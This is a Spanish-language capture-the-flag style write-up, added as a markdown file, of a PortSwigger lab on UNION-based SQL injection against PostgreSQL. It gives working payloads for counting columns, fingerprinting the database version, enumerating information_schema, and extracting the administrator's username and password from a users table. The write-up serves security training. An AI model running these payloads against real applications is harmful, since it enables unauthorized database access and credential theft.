@@ -1,0 +1,137 @@
+---
+title: "#9 - SQL injection UNION attack, retrieving data from other tables"
+description: "Enumeración de bases de datos, tablas y columnas mediante information_schema para extraer credenciales de administrator vía inyección SQL basada en UNION."
+date: "2026-07-13"
+tags: ["portswigger", "sql-injection", "postgresql", "union-based", "information-schema", "practitioner"]
+category: "sql-injection"
+difficulty: "PRACTITIONER"
+---
+
+**Laboratorio:** [Lab: SQL injection UNION attack, retrieving data from other tables | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+
+- Objetivo:  Obtener las credenciales del usuario `administrator` y autenticarse en el sistema.
+
+## **Análisis inicial**
+
+La aplicación presenta artículos filtrados por categoría a través de una consulta SQL vulnerable, lo que permite inyectar sentencias maliciosas.
+
+## Consulta original:
+
+```sql
+SELECT * FROM articles WHERE category = ''
+```
+
+La consulta filtra los artículos según la categoría proporcionada en la URL. Esta entrada es vulnerable y puede ser manipulada para ejecutar consultas arbitrarias mediante la cláusula `UNION`.
+
+## 🔎 Observación sobre UNION
+
+La inyección SQL basada en `UNION` permite combinar resultados de múltiples sentencias `SELECT` en una sola salida. Es útil cuando el atacante quiere recuperar datos adicionales de otras tablas, como versiones, usuarios, contraseñas, etc.
+
+## Solución
+
+- **Determinar el número de columnas**
+    
+    Antes de usar `UNION`, necesitamos saber cuántas columnas devuelve la consulta original. Para eso, se usa la técnica `ORDER BY`.
+    
+    **Payloads utilizados:**
+    
+    ```sql
+    ' ORDER BY 1--
+    ' ORDER BY 2--
+    ' ORDER BY 3-- <-Error
+    ```
+    
+    - Se incrementa el número hasta provocar un error.
+    - En este caso, `ORDER BY 3` falla, lo que indica que hay **2 columnas**.
+    
+- **Validar la inyección `UNION`**
+    
+    Una vez sabemos que hay 2 columnas, probamos una inyección básica para confirmar que `UNION SELECT` funciona correctamente.
+    
+    **Payload de prueba:**
+    
+    ```sql
+    ' UNION SELECT NULL,NULL--
+    ```
+    
+    - Esto confirma que la inyección funciona y el atacante puede controlar el contenido de la salida.
+    
+- Obtener versión del motor de base de datos
+    
+    Se probaron diferentes comandos para identificar la versión del motor de base de datos, dependiendo del sistema (MySQL, PostgreSQL, Microsoft SQL Server, etc.). Entre ellos:
+    
+    - `SELECT @@version`
+    - `SELECT version()`
+    - `SELECT banner FROM v$version`
+    
+    En este caso, se identificó que el backend corresponde a **PostgreSQL**, y el comando exitoso fue:
+    
+    ```sql
+    ' UNION SELECT version(),NULL--
+    ```
+    
+    - Esto devuelve una cadena con la versión específica del motor, por ejemplo:
+
+![Resultado de la consulta UNION mostrando la versión del motor PostgreSQL](/writeups/portswigger/9_sql_injection_union_retrieve_data_other_tables/image.png)
+
+- Enumerar las bases de datos
+    
+    Utilizamos `information_schema.schemata` para listar las bases de datos disponibles:
+    
+    ```sql
+    ' UNION SELECT schema_name, NULL FROM information_schema.schemata--
+    ```
+    
+    Resultado:
+    
+    - `pg_catalog`
+    - `public`
+
+- Enumerar las tablas
+    
+    Buscamos las tablas en el esquema `public`:
+    
+    ```sql
+    ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'--
+    ```
+    
+    Resultado:
+    
+    - **`products`**
+    - **`users`**(el nombre puede variar)
+
+- Enumerar las columnas de la tabla
+    
+    Una vez identificada la tabla, se consultan sus columnas:
+    
+    ```sql
+    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '**users**'--
+    ```
+    
+    Resultado:
+    
+    - `username`(el nombre puede variar)
+    - `email`
+    - `password`(el nombre puede variar)
+
+- Obtener credenciales del usuario `administrator`
+    
+    Finalmente, se extraen los datos sensibles directamente desde la tabla `users`:
+    
+    ```sql
+    ' UNION SELECT username, password FROM **users--**
+    ```
+    
+    Resultado:
+    
+    - Usuario: `administrator`
+    - Contraseña: `uye9a4rf5fd5sajxnhhl`
+        
+        ![Resultado de la consulta UNION mostrando las credenciales del usuario administrator extraídas de la tabla users](/writeups/portswigger/9_sql_injection_union_retrieve_data_other_tables/image%201.png)
+        
+
+## ✅ Resultado
+
+Con las credenciales recuperadas, se accede al sistema como `administrator`.
+
+![Acceso exitoso al sistema como el usuario administrator usando las credenciales extraídas](/writeups/portswigger/9_sql_injection_union_retrieve_data_other_tables/685b5599-b679-4e2f-ae9f-8281efcc4c8a.png)
